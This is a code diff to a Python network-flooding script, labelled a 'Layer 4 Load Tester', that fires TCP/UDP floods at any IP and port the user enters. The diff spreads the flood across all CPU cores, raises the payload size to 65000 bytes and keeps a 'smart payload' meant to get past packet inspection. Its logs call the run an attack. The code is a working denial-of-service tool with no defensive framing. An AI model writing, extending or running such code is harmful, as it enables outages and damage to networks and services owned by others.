@@ -3,6 +3,7 @@ import random
 import socket
 import logging
 import sys
+import multiprocessing
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -64,24 +65,12 @@ async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id
 		except Exception:
 			await asyncio.sleep(0.001)
 
-async def main():
-	print("--- Layer 4 Load Tester (Hibernet-Level Power) ---")
-	target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip()
-	target_port = int(input("Insert Target Port (e.g. 80): ").strip())
-	method = input("Select Method (TCP/UDP): ").strip().upper()
-	threads = int(input("Insert number of async workers (e.g. 5000): ").strip())
-	packet_size = int(input("Insert Payload Size in bytes (default 1024): ") or "1024")
-	
-	# Generate smart payload to bypass simple packet inspection
-	payload = generate_smart_payload(packet_size)
-	
+async def async_attack_core(target_ip, target_port, method, threads, payload):
 	# Massive concurrency limit for L4 (OS network stack limit)
 	conn_limit = min(threads, 20000)
 	semaphore = asyncio.Semaphore(conn_limit)
 	
 	tasks = []
-	logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers...")
-	
 	for x in range(threads):
 		if method == 'UDP':
 			tasks.append(asyncio.create_task(udp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
@@ -91,13 +80,51 @@ async def main():
 	try:
 		await asyncio.gather(*tasks)
 	except asyncio.CancelledError:
-		logging.info("Attack successfully cancelled.")
+		pass
+
+def process_worker(target_ip, target_port, method, threads, payload):
+	if sys.platform == 'win32':
+		asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+	try:
+		asyncio.run(async_attack_core(target_ip, target_port, method, threads, payload))
+	except KeyboardInterrupt:
+		pass
+
+def main():
+	print("--- Layer 4 Load Tester (MULTIPROCESSING POWER) ---")
+	target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip()
+	target_port = int(input("Insert Target Port (e.g. 80): ").strip())
+	method = input("Select Method (TCP/UDP): ").strip().upper()
+	threads = int(input("Insert TOTAL async workers (e.g. 10000): ").strip())
+	packet_size = int(input("Insert Payload Size in bytes (default 65000): ") or "65000")
+	
+	# Generate smart payload to bypass simple packet inspection
+	payload = generate_smart_payload(packet_size)
+	
+	cores = multiprocessing.cpu_count() or 1
+	threads_per_core = max(1, threads // cores)
+	
+	logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers across {cores} CPU Cores!")
+	logging.info(f"Payload Size: {len(payload)} bytes. Standby for maximum raw socket injection...")
+	
+	processes = []
+	for _ in range(cores):
+		p = multiprocessing.Process(target=process_worker, args=(target_ip, target_port, method, threads_per_core, payload))
+		p.start()
+		processes.append(p)
+		
+	try:
+		for p in processes:
+			p.join()
+	except KeyboardInterrupt:
+		logging.info("Attack successfully cancelled. Terminating processes...")
+		for p in processes:
+			p.terminate()
 
 if __name__ == '__main__':
+	multiprocessing.freeze_support()
 	try:
-		if sys.platform == 'win32':
-			asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-		asyncio.run(main())
+		main()
 	except KeyboardInterrupt:
 		print("\nStopped by user.")
 		sys.exit(0)
